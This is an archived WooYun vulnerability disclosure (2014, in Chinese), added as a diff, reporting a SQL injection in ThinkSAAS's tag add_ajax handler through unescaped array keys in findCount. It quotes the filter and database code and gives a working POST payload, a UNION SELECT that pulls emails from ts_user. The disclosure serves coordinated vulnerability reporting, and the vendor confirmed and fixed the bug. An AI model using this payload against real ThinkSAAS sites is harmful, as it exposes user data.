@@ -1,0 +1,422 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Thinksaas某处绕过过滤的注射漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Thinksaas某处绕过过滤的注射漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/′  雨。">′  雨。</a> 
+</li><li>提交时间：		2014-02-03 17:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-07：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-24：	细节向普通白帽子公开<br/>
+									2014-03-16：	细节向实习白帽子公开<br/>
+									2014-05-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">添加标签过滤不严。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">今天下了一个thinksaas 最新版， 就看了看<br />
+<br />
+<br />
+<br />
+在xfkxfk 爆了一些洞后 还是变安全了一些。 但是还是有很多依旧没过滤。<br />
+<br />
+<br />
+<br />
+xfkxfk 爆了app/tag/action/add.php<br />
+<br />
+<br />
+<br />
+我看的漏洞文件 app/tag/action/add_ajax.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>case &quot;do&quot;:<br />
+	<br />
+		$objname = t($_POST[&#039;objname&#039;]);<br />
+		$idname = t($_POST[&#039;idname&#039;]);<br />
+		$objid = t($_POST[&#039;objid&#039;]);<br />
+		$tags = t($_POST[&#039;tags&#039;]);<br />
+		<br />
+		$new[&#039;tag&#039;]-&gt;addTag($objname,$idname,$objid,$tags);<br />
+		<br />
+		echo &quot;&lt;script language=JavaScript&gt;parent.window.location.reload();&lt;/script&gt;&quot;;<br />
+	<br />
+		break;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ 做了过滤 <br />
+<br />
+<br />
+<br />
+function t($text) {<br />
+<br />
+	$text = preg_replace ( &#039;/\[.*?\]/is&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = cleanJs ( $text );<br />
+<br />
+	// 彻底过滤空格BY QINIAO<br />
+<br />
+	$text = preg_replace ( &#039;/\s(?=\s)/&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = preg_replace ( &#039;/[\n\r\t]/&#039;, &#039; &#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;  &#039;, &#039; &#039;, $text );<br />
+<br />
+	// $text = str_replace ( &#039; &#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;&amp;nbsp;&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;&amp;&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;=&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;-&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;#&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;%&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;!&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;@&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;^&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;*&#039;, &#039;&#039;, $text );<br />
+<br />
+	$text = str_replace ( &#039;amp;&#039;, &#039;&#039;, $text );<br />
+<br />
+	<br />
+<br />
+	$text = str_replace ( &#039;position&#039;, &#039;&#039;, $text );<br />
+<br />
+	<br />
+<br />
+	$text = strip_tags ( $text );<br />
+<br />
+	$text = htmlspecialchars ( $text );<br />
+<br />
+	$text = str_replace ( &quot;&#039;&quot;, &quot;&quot;, $text );<br />
+<br />
+	return $text;<br />
+<br />
+}&lt;/code&gt;<br />
+<br />
+过滤了单引号 还有各种注释。。  <br />
+<br />
+<br />
+<br />
+过滤了之后 带入了addTag<br />
+<br />
+<br />
+<br />
+</p><pre><code>function addTag($objname,$idname,$objid,$tags){<br />
+	    <br />
+		if($objname != &#039;&#039; &amp;&amp; $idname != &#039;&#039; &amp;&amp; $objid!=&#039;&#039; &amp;&amp; $tags!=&#039;&#039;){<br />
+			$tags = str_replace ( &#039;，&#039;, &#039;,&#039;, $tags );<br />
+			$arrTag = explode(&#039;,&#039;,$tags);<br />
+			foreach($arrTag as $item){<br />
+				$tagname = t($item);<br />
+				if(strlen($tagname) &lt; &#039;32&#039; &amp;&amp; $tagname != &#039;&#039;){<br />
+					$uptime = time();<br />
+					<br />
+					$tagcount = $this-&gt;findCount(&#039;tag&#039;,array(<br />
+						&#039;tagname&#039;=&gt;$tagname,<br />
+					));<br />
+					<br />
+					if($tagcount == &#039;0&#039;){<br />
+						<br />
+						$tagid = $this-&gt;create(&#039;tag&#039;,array(<br />
+							&#039;tagname&#039;=&gt;$tagname,<br />
+							&#039;uptime&#039;=&gt;$uptime,<br />
+						));<br />
+						<br />
+						$tagIndexCount = $this-&gt;findCount(&#039;tag_&#039;.$objname.&#039;_index&#039;,array(<br />
+							$idname=&gt;$objid,<br />
+							&#039;tagid&#039;=&gt;$tagid,<br />
+						));<br />
+						<br />
+						if($tagIndexCount == &#039;0&#039;){<br />
+							<br />
+							$this-&gt;create(&quot;tag_&quot;.$objname.&quot;_index&quot;,array(<br />
+								$idname=&gt;$objid,<br />
+								&#039;tagid&#039;=&gt;$tagid,<br />
+							));<br />
+							<br />
+						}<br />
+						<br />
+						$tagIdCount = $this-&gt;findCount(&quot;tag_&quot;.$objname.&quot;_index&quot;,array(<br />
+							&#039;tagid&#039;=&gt;$tagid,<br />
+						));<br />
+						<br />
+						$count_obj = &quot;count_&quot;.$objname;<br />
+						<br />
+						$this-&gt;update(&#039;tag&#039;,array(<br />
+							&#039;tagid&#039;=&gt;$tagid,<br />
+						),array(<br />
+							$count_obj=&gt;$tagIdCount,<br />
+						));<br />
+						<br />
+					}else{<br />
+<br />
+						$tagData = $this-&gt;find(&#039;tag&#039;,array(<br />
+							&#039;tagname&#039;=&gt;$tagname,<br />
+						));<br />
+						<br />
+						$tagIndexCount = $this-&gt;findCount(&quot;tag_&quot;.$objname.&quot;_index&quot;,array(<br />
+							$idname=&gt;$objid,<br />
+							&#039;tagid&#039;=&gt;$tagData[&#039;tagid&#039;],<br />
+						));<br />
+						<br />
+						if($tagIndexCount == &#039;0&#039;){<br />
+							<br />
+							$this-&gt;create(&quot;tag_&quot;.$objname.&quot;_index&quot;,array(<br />
+							<br />
+								$idname=&gt;$objid,<br />
+								&#039;tagid&#039;=&gt;$tagData[&#039;tagid&#039;],<br />
+							<br />
+							));<br />
+							<br />
+						}<br />
+						<br />
+						$tagIdCount = $this-&gt;findCount(&quot;tag_&quot;.$objname.&quot;_index&quot;,array(<br />
+							&#039;tagid&#039;=&gt;$tagData[&#039;tagid&#039;],<br />
+						));<br />
+						<br />
+						$count_obj = &quot;count_&quot;.$objname;<br />
+						<br />
+						$this-&gt;update(&#039;tag&#039;,array(<br />
+							&#039;tagid&#039;=&gt;$tagData[&#039;tagid&#039;],<br />
+						),array(<br />
+							$count_obj=&gt;$tagIdCount,<br />
+							&#039;uptime&#039;=&gt;$uptime,<br />
+						));<br />
+						<br />
+					}<br />
+					<br />
+				}<br />
+			}<br />
+		}<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>$tagIndexCount = $this-&gt;findCount(&#039;tag_&#039;.$objname.&#039;_index&#039;,array(<br />
+							$idname=&gt;$objid,<br />
+							&#039;tagid&#039;=&gt;$tagid,<br />
+						));</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+可以看到 直接$idname 做key了。<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function findCount($table, $conditions = null) {<br />
+		$where = &quot;&quot;;<br />
+		if (is_array ( $conditions )) {<br />
+			$join = array ();<br />
+			foreach ( $conditions as $key =&gt; $condition ) {<br />
+				$condition = $this-&gt;escape ( $condition );<br />
+				$join [] = &quot;{$key} = {$condition}&quot;;<br />
+			}<br />
+			$where = &quot;WHERE &quot; . join ( &quot; AND &quot;, $join );<br />
+		} else {<br />
+			if (null != $conditions)<br />
+				$where = &quot;WHERE &quot; . $conditions;<br />
+		}<br />
+		$sql = &quot;SELECT COUNT(*) AS ts_counter FROM &quot; . dbprefix . &quot;{$table} {$where}&quot;;<br />
+		$result = $this-&gt;db-&gt;once_fetch_assoc ( $sql );<br />
+		<br />
+		return $result [&#039;ts_counter&#039;];<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+但是key是未过滤的。过滤了value<br />
+<br />
+所以这里function t 过滤了单引号也没什么了  因为可以在key那里注入。<br />
+<br />
+但是过滤了注释 后面这样就行了<br />
+<br />
+<br />
+<br />
+objid=123&amp;objname=article&amp;idname=123 union select email from ts_user limit 1,1;a&amp;tags=idname<br />
+<br />
+<br />
+<br />
+即可注入。  可以盲注 、延时。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/031534110ee2c68d17906156a9d5240c15473f3f.jpg" target="_blank"><img src="../images/031534110ee2c68d17906156a9d5240c15473f3f.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0315342619a987dacc91dfdaee8ef6e70936faa0.jpg" target="_blank"><img src="../images/0315342619a987dacc91dfdaee8ef6e70936faa0.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+嗯 可以执行了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">    但是  xfkxfk 爆的那个漏洞文件后 发布新版本后 你们做了过滤 <br />
+<br />
+<br />
+<br />
+ 但是过滤得不好, 会add_ajax 比好绕过。<br />
+<br />
+<br />
+<br />
+为了避免和xfkxfk 爆的漏洞文件一样 所以我换了个文件。<br />
+<br />
+<br />
+<br />
+加强过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/′  雨。" title="′  雨。">′  雨。</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050236" title="Thinksaas某处绕过过滤的注射漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2014-02-04 15:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢支持，已经做了修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50236";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
